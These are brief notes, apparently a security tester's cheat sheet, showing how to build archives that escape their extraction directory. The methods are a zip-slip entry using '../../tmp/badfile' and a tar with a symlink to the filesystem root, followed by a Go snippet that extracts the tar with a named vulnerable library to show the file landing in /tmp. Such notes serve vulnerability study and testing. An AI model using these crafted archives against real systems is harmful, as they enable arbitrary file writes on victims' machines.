
### path traversal (zip slip)

zip traversal.zip ../../tmp/badfile
unzip traversal -vl traversal.zip

### symlinks

make link in your local dir:
ln -s / root
root will get perms lrwxr-xr-x and point to -> root
tar -cf smlnk.tar root/ root/tmp/badfile

tar -tf smlnk.tar lists contents:
	root
	root/tmp/badfile

example using vuln go lib to extract files
```go
package main

import "github.com/mholt/archiver"

func main() {
	archiver.Tar.Open("test.tar", "test.out")
}
```
go run test.go
the root symlink is ext to dir test.out and badfile to /tmp





